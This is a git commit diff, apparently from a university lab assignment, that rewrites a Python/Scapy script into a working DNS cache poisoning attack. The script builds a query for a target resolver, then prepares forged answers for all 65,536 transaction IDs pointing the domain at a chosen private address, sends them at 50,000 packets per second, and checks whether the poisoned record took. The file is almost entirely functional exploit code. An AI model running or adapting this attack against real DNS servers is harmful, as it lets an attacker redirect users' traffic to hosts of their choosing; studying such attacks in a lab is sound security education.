d4f17967f1d97ef91d44b3fa92675b496d92ab92
Marc Schulz-Narres <git@marcsn.de>
2016-12-22 14:07:13 +0100

    sendpfast etc

--- Aufgabe_3/poison.py
+++ Aufgabe_3/poison.py
@@ -1,41 +1,39 @@
-from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, dnsqtypes, sr1
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, dnsqtypes, sr1, sendpfast, Ether
 from socket import AF_INET, SOCK_DGRAM, socket
 from traceback import print_exc
 import threading
+import time
 
 sock = socket(AF_INET, SOCK_DGRAM)
 sock.bind(('0.0.0.0', 1234))
 
-targetaddr="192.168.56.101"
+targetaddr="192.168.0.106"
 
 def request(url, addr):
-	print("Requesting adress of {} from DNS Server running on {}".format(url, addr))
-	answer = sr1(IP(dst=addr)/UDP()/DNS(rd=1,qd=DNSQR(qname=url)),verbose=0)
-
-	print(answer[DNS].summary())
+	return Ether()/IP(dst=addr)/UDP()/DNS(rd=1,qd=DNSQR(qname=url))
 
 def reply(id, url, addr):
-	response = DNS(
+	response = Ether()/IP(dst=targetaddr)/UDP()/DNS(
 		id=id, ancount=1, qr=1, aa=0, ra=0, rd=0,
 		qdcount=1,
-		qd=DNS(rd=1,qd=DNSQR(qname=url)),
-		an=DNSRR(rrname=url, type='A', rdata="192.168.56.1", ttl=1234))
-	sock.sendto(bytes(response), (addr, 53))
+		qd=DNSQR(qname=url, qtype='A', qclass='IN'),
+		an=DNSRR(rrname=url, type='A', rdata="192.168.0.104", ttl=1234))
+	return response
 
-#TODO: Send DNS request async and start flooding the target dns server with fake answers using reply function and guessed ids
+targeturl="abc2.asdsdf.com"
 
-
-targeturl="abc1.asdfsdf.com"
-
-#request(targeturl, targetaddr)
-
-thr = threading.Thread(target=request, args=[targeturl, targetaddr])
-thr.start()
+pkts = []
+pkts.append(request(targeturl, targetaddr))
 i=0
-while thr.is_alive() and i <= 65535:
-#	reply(i, targeturl, targetaddr)
-#	i+=1
-	pass
+while i <= 65535:
+	pkts.append(reply(i, targeturl, targetaddr))
+	i+=1
 
-if i>65535: 
-	print("Tried all possible transaction ids without getting a reply. something went wrong :(")
+print("Packets Prepared")
+
+#sendpfast([request(targeturl, targetaddr)], pps=70000, iface="wlan0")
+#time.sleep(0.2)
+sendpfast(pkts, pps=50000, iface="wlan0")
+
+answer = sr1(IP(dst=targetaddr)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=targeturl)),verbose=0)
+print(answer[DNS].summary())
